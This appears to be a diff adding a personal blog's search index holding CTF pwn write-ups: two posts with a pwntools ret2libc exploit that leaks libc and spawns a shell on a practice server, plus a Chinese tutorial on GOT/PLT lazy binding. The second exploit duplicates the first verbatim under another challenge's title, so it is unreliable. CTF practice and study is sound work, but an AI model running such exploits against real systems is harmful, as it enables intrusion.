@@ -1,0 +1,100 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+  
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="/2022/11/16/testtest/"/>
+    <url>/2022/11/16/testtest/</url>
+    
+    <content type="html"><![CDATA[<p>1fwefeww</p><p>dasdadfff</p><p>qdd</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>ROP ciscn_2019_c_1</title>
+    <link href="/2022/11/16/ROP%20ciscn_2019_c_1/"/>
+    <url>/2022/11/16/ROP%20ciscn_2019_c_1/</url>
+    
+    <content type="html"><![CDATA[<p><strong>题目</strong></p><p><a href="https://buuoj.cn/challenges#ciscn_2019_c_1">https://buuoj.cn/challenges#ciscn_2019_c_1</a></p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28818</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment">#payload 1</span><br>payload1 = <span class="hljs-string">&#x27;\x00&#x27;</span> + <span class="hljs-string">&#x27;\xff&#x27;</span> * <span class="hljs-number">7</span><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br><br><span class="hljs-comment">#payload 2</span><br>payload2 = (<span class="hljs-number">231</span> + <span class="hljs-number">4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(e.plt[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">0x08048825</span>) +p32(<span class="hljs-number">1</span>) + p32(e.got[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">4</span>)<br><br>p.sendline(payload2)<br><br><span class="hljs-comment"># leak addr</span><br>write_got = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_got))<br><br><span class="hljs-comment">#payload 3</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>libc.address =  write_got - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>p.sendline(payload1)<br>payload3 =  (<span class="hljs-number">231</span> + <span class="hljs-number">4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(system) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh)<br>p.sendline(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>ctf-pwn</tag>
+      
+      <tag>exp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>HarekazeCTF2019 baby_rop</title>
+    <link href="/2022/11/16/HarekazeCTF2019baby_rop/"/>
+    <url>/2022/11/16/HarekazeCTF2019baby_rop/</url>
+    
+    <content type="html"><![CDATA[<p><strong>题目</strong></p><p><a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop</a></p><p>从给定libc获取获取基址</p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28818</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment">#payload 1</span><br>payload1 = <span class="hljs-string">&#x27;\x00&#x27;</span> + <span class="hljs-string">&#x27;\xff&#x27;</span> * <span class="hljs-number">7</span><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br><br><span class="hljs-comment">#payload 2</span><br>payload2 = (<span class="hljs-number">231</span> + <span class="hljs-number">4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(e.plt[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">0x08048825</span>) +p32(<span class="hljs-number">1</span>) + p32(e.got[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">4</span>)<br><br>p.sendline(payload2)<br><br><span class="hljs-comment"># leak addr</span><br>write_got = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_got))<br><br><span class="hljs-comment">#payload 3</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>libc.address =  write_got - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>p.sendline(payload1)<br>payload3 =  (<span class="hljs-number">231</span> + <span class="hljs-number">4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(system) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh)<br>p.sendline(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>ctf-pwn</tag>
+      
+      <tag>exp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>GOT表和PLT表</title>
+    <link href="/2022/11/16/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8/"/>
+    <url>/2022/11/16/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8/</url>
+    
+    <content type="html"><![CDATA[<p>Linux 动态链接与延迟绑定机制</p><p><strong>Q：</strong></p><ol><li>为什么ret2libc泄露基址时要选择已经使用过的函数？</li><li>何为延迟绑定？</li></ol><h2 id="Linux-动态链接与延迟绑定机制"><a href="#Linux-动态链接与延迟绑定机制" class="headerlink" title="Linux 动态链接与延迟绑定机制"></a>Linux 动态链接与延迟绑定机制</h2><p>​    假设，写了一个函数<code>f()</code>，调用了glibc中函数<code>x()</code>，在可执行文件是如何编译的？</p><p>​    对于libc中的函数，例如system、puts、write等，需要在程序运行时动态加载到内存中，不同版本的libc加载的位置各不相同，gcc没有办法直接在函数<code>f()</code>的汇编指令中直接call函数<code>x()</code>的真实地址</p><p>​    因此，需要在调用前加入一个寻找函数地址的过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text<br> ...<br> call f_stub<br> ...<br> <br> ...<br> f_stub:<br>  1. find and save function f() entry point in f_stub_addr<br>     2. mov eax, [f_addr]<br>        jmp eax<br> ...<br> <br>.data<br> f_addr  // 存储实际的f()地址<br></code></pre></td></tr></table></figure><p>​    如上述过程，f_stub去寻找实际的地址，存储在f_addr中，然后调用它</p><p>​    linux的动态链接过程与上述类似，也是由一个存放外部函数地址数据GOT表（对应f_addr)，和一段函数调用额外的代码PLT表（对应f_stub)</p><p>​    后文会具体分析其机制</p><h5 id="实验参考"><a href="#实验参考" class="headerlink" title="实验参考"></a>实验参考</h5><p><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL</a></p><p><a href="https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click</a></p><h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_banner</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    print_banner();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="编译链接"><a href="#编译链接" class="headerlink" title="编译链接"></a>编译链接</h5><p><code>gcc -Wall  -g test.c -o test.o -m32</code></p><p><strong>平台</strong>： <strong>kali</strong>-<strong>linux</strong></p><p>开始调试</p><p><strong>首先，在printf函数调用前下一个断点</strong></p><p><img src="/img/plt&got/1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[-------------------------------------code-------------------------------------]<br>   0x555555555134 &lt;frame_dummy+4&gt;:      jmp    0x5555555550b0 &lt;register_tm_clones&gt;<br>   0x555555555139 &lt;print_banner&gt;:       push   rbp<br>   0x55555555513a &lt;print_banner+1&gt;:     mov    rbp,rsp<br>=&gt; 0x55555555513d &lt;print_banner+4&gt;:     lea    rax,[rip+0xec4]        # 0x555555556008<br>   0x555555555144 &lt;print_banner+11&gt;:    mov    rdi,rax<br>   0x555555555147 &lt;print_banner+14&gt;:    call   0x555555555030 &lt;puts@plt&gt;<br>   0x55555555514c &lt;print_banner+19&gt;:    nop<br>   0x55555555514d &lt;print_banner+20&gt;:    pop    rbp<br></code></pre></td></tr></table></figure><p>跳转到了0x555555555030这个地址，gdb对其的标注为&lt;puts@plt&gt;</p><p>查看一下这个地址上的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x555555555030<br>   0x555555555030 &lt;puts@plt&gt;:   jmp    QWORD PTR [rip+0x2fca]        # 0x555555558000 &lt;puts@got[plt]&gt;<br>   0x555555555036 &lt;puts@plt+6&gt;: push   0x0<br>   0x55555555503b &lt;puts@plt+11&gt;:        jmp    0x555555555020<br></code></pre></td></tr></table></figure><p>这里第一条指令，jmp 0x555555558000，gdb对其的标注为&lt;puts@got[plt]&gt;，查看这个地址上的值，会发现这个指令在原地跳转：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555558000 <br>0x555555558000 &lt;puts@got[plt]&gt;: 0x0000555555555036 //这个地址就是上面plt表的第二条指令<br></code></pre></td></tr></table></figure><p>相当于什么也没做</p><p>那么根据文章开头的介绍，寻找函数的工作肯定是由第三条指令，<code>jmp 0x555555555020</code>来完成的，这里先不对这个函数进行分析，直接来看结果</p><p><strong>在printf函数后面下断点，重新查看刚才&lt;puts@got[plt]&gt;上的内容</strong></p><p><img src="/img/plt&got/2.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555558000<br>0x555555558000 &lt;puts@got[plt]&gt;: 0x00007ffff7c75db0<br></code></pre></td></tr></table></figure><p>发现这个地方的值变了，而这个改变后的值就是puts函数在libc中的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x00007ffff7c75db0<br>   0x7ffff7c75db0 &lt;__GI__IO_puts&gt;:      push   r14<br>   0x7ffff7c75db2 &lt;__GI__IO_puts+2&gt;:    push   r13<br>   0x7ffff7c75db4 &lt;__GI__IO_puts+4&gt;:    push   r12<br>   0x7ffff7c75db6 &lt;__GI__IO_puts+6&gt;:    mov    r12,rdi<br>   0x7ffff7c75db9 &lt;__GI__IO_puts+9&gt;:    push   rbp<br>   0x7ffff7c75dba &lt;__GI__IO_puts+10&gt;:   push   rbx<br>   0x7ffff7c75dbb &lt;__GI__IO_puts+11&gt;:   sub    rsp,0x10<br>   0x7ffff7c75dbf &lt;__GI__IO_puts+15&gt;:   call   0x7ffff7c28110 &lt;*ABS*+0x99da0@plt&gt;<br>   0x7ffff7c75dc4 &lt;__GI__IO_puts+20&gt;:   mov    r13,QWORD PTR [rip+0x17e04d]        # 0x7ffff7df3e18<br>   0x7ffff7c75dcb &lt;__GI__IO_puts+27&gt;:   mov    rbx,rax<br></code></pre></td></tr></table></figure><p><strong>因此可以得出结论</strong></p><p>​    plt表中会先尝试跳转到got表上的函数地址，如果是第一次调用，会进行一次无效跳转，然后去寻找真正的地址填充在got表项上，然后调用；如果是第二次调用，会直接jmp到got表真实的函数地址上</p><p>​    这样就是为什么ret2libc需要使用用已被调用过的函数</p><p><em>tips：</em></p><p><em>linux程序都有一个libc_start_main函数，且会在main函数之前被调用，所以可以在ret2libc时无脑用这个函数(只是个人猜测，并未实际验证)</em></p><p><strong>然后解决如何寻找函数地址的问题</strong>：</p><p>​    在plt表的第二条汇编指令中，push 0x0为寻址函数提供了一个参数，如果打开一个具有多个plt表项的程序，会发现每一项这个值都是不同的：</p><p><img src="/img/plt&got/3.jpg"></p><p>​    这个push的值唯一标识了寻找的函数，</p><p>​    然后再看第三条指令，观察发现这个jmp指令跳转到了plt表的开头（可以在objdump里看到这也是一个plt表项，但是代码与其他表项形式不同）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x555555555020<br>   0x555555555020:      push   QWORD PTR [rip+0x2fca]        # 0x555555557ff0<br>   0x555555555026:      jmp    QWORD PTR [rip+0x2fcc]        # 0x555555557ff8<br></code></pre></td></tr></table></figure><p>如果在gdb未开始调试的时候，查看这个jmp的值，是0x0</p><p>而在printf函数前的断点查看，会发现它发生了变化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555557ff8<br>0x555555557ff8: 0x00007ffff7fdc080<br><br>gdb-peda$ x/10i 0x00007ffff7fdc080<br>   0x7ffff7fdc080 &lt;_dl_runtime_resolve_xsavec&gt;: push   rbx<br>   0x7ffff7fdc081 &lt;_dl_runtime_resolve_xsavec+1&gt;:       mov    rbx,rsp<br>   0x7ffff7fdc084 &lt;_dl_runtime_resolve_xsavec+4&gt;:       and    rsp,0xffffffffffffffc0<br>   0x7ffff7fdc088 &lt;_dl_runtime_resolve_xsavec+8&gt;:<br>    sub    rsp,QWORD PTR [rip+0x20be1]        # 0x7ffff7ffcc70 &lt;_rtld_global_ro+432&gt;<br>   0x7ffff7fdc08f &lt;_dl_runtime_resolve_xsavec+15&gt;:      mov    QWORD PTR [rsp],rax<br>   0x7ffff7fdc093 &lt;_dl_runtime_resolve_xsavec+19&gt;:      mov    QWORD PTR [rsp+0x8],rcx<br>   0x7ffff7fdc098 &lt;_dl_runtime_resolve_xsavec+24&gt;:      mov    QWORD PTR [rsp+0x10],rdx<br>   0x7ffff7fdc09d &lt;_dl_runtime_resolve_xsavec+29&gt;:      mov    QWORD PTR [rsp+0x18],rsi<br>   0x7ffff7fdc0a2 &lt;_dl_runtime_resolve_xsavec+34&gt;:      mov    QWORD PTR [rsp+0x20],rdi<br>   0x7ffff7fdc0a7 &lt;_dl_runtime_resolve_xsavec+39&gt;:      mov    QWORD PTR [rsp+0x28],r8<br><br></code></pre></td></tr></table></figure><p>这个函数为<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，此处不在对其具体分析，其用处即为寻找编号为<code>reloc_index</code>的函数</p><h5 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h5><p><strong>第一次调用</strong></p><p><img src="/img/plt&got/4.jpg"></p><p><strong>第二次调用</strong></p><p><img src="/img/plt&got/5.jpg"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>ctf-pwn</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>可爱的小黄鸡</title>
+    <link href="/2022/11/16/%E5%B0%8F%E9%BB%84%E9%B8%A1/"/>
+    <url>/2022/11/16/%E5%B0%8F%E9%BB%84%E9%B8%A1/</url>
+    
+    <content type="html"><![CDATA[<p>可爱的小黄鸡 0v0</p><p><img src="/img/basic/1.jpg"><br><img src="/img/basic/2.jpg"><br><img src="/img/basic/3.jpg"><br><img src="/img/basic/4.jpg"><br><img src="/img/basic/5.jpg"><br><img src="/img/basic/6.jpg"><br><img src="/img/basic/7.jpg"><br><img src="/img/basic/8.jpg"><br><img src="/img/basic/9.jpg"><br><img src="/img/basic/1.gif"><br><img src="/img/basic/2.gif"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Others</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  
+</search>
